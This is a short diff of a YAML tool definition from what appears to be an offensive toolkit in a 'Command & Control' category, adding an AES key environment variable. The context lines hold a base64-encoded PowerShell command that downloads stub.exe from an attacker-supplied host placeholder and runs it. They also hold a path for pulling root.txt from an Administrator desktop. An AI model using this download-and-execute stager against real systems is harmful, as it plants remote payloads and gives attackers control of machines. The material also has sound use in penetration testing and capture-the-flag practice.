@@ -27,4 +27,6 @@ tool:
   download_file: C:\Users\Administrator\Desktop\root.txt
   lazycommand: encodewinbase64 powershell -c 'Invoke-WebRequest "http://{lhost}/stub.exe"
     -OutFile "stub.exe"; Start-Process "stub.exe"'
+  env:
+    LAZYOWN_AES_KEY: "{aes_key}"
 category: 10. Command & Control
